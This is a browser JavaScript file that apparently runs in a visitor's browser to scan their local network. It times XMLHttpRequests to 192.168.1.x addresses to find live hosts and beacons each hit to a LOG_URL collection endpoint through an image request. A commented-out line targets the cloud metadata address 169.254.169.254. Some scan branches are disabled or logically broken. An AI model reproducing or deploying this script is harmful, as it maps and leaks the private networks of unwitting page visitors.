var LOG_URL = "";
var discoveredHosts = [];
var timeout = 1000; //1 sec

function doRequest(host)
{
  var d = new Date();
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = processRequest;
  xhr.timeout = timeout;

  function processRequest()
  {
    if (xhr.readyState == 4)
    {
      var time = new Date().getTime() - d.getTime();
      var aborted = false;

      xhr.onabort = function()
      {
        aborted = true;
      }

      xhr.onloadend = function()
      {
        if (time < timeout)
        {
          if (time > 10 && aborted == false)
          {
            console.log('Host Found -> ' + host + ' in ' + time + ' ms');
            let imgLog = new Image();
            imgLog.src = LOG_URL + "?IP=" + host + "&time=" + time;
            discoveredHosts.push(host);
          }
        }
      }
    }
  }
  xhr.open("GET", "http://" + host, true);
  xhr.send();
}

var startTime = new Date().getTime();

function checkComplete()
{
  var currentTime = new Date().getTime();
  if ((currentTime - startTime) > timeout + 1000)
  {
    window.stop();
    clearInterval(checkCompleteInterval);
    console.log('Discovered Hosts: \n' + discoveredHosts.join("\n"));
  }
}

var checkCompleteInterval = setInterval(function()
{
  checkComplete()
}, 1000);


var local_ip_ranges = ["10.", "192.168.", "172.16."];

for (let i = 0 ; i < local_ip_ranges.length ; i++)
{
  let ip = "";
  let bit1 = 0;
  let bit2 = 0;
  let bit3 = 20;
  let bit4 = 0;

  //10.X.X.X
  if (i == 0)
  {
      ip = "10.";
      while (bit2 <= 255)
      {
        while (bit3 <= 255)
        {
          while (bit4 < 1)
          {
            bit4++;
            ip = "10." + bit2 + "." + bit3 + "." + bit4;
            //custom_scan(ip, "80");
          }
          bit4 = 0;
          bit3++;
        }
        bit3 = 0;
        bit2++;
      }
      bit2 = 0;
  }
  //192.168.X.X
  else if (i == 1)
  {
      ip = "192.168.1";
      //while (bit3 <= 255)
      //{
        while (bit4 <= 255)
        {
          bit4++;
          ip = "192.168.1"  + "." + bit4;
          doRequest(ip);
        }
        bit4 = 0;
        bit3++;
      //}
      bit3 = 0;
  }
  //172.<16-254>.X
  else if (i == 2)
  {
      ip = "172.";
      bit2 = 66;

      while (bit2 <= 50)
      {
        while (bit3 < 1)
        {
          while (bit4 < 1)
          {
            bit4++;
            ip = "172." + bit2 + ".1" + "." + bit4;
            //custom_scan("169.254.169.254", "80");
          }
          bit4 = 0;
          bit3++;
        }
        bit3 = 0;
        bit2++;
      }
      bit2 = 0;
  }
}

//doRequest("192.168.1.1");
//doRequest("192.168.1.100");
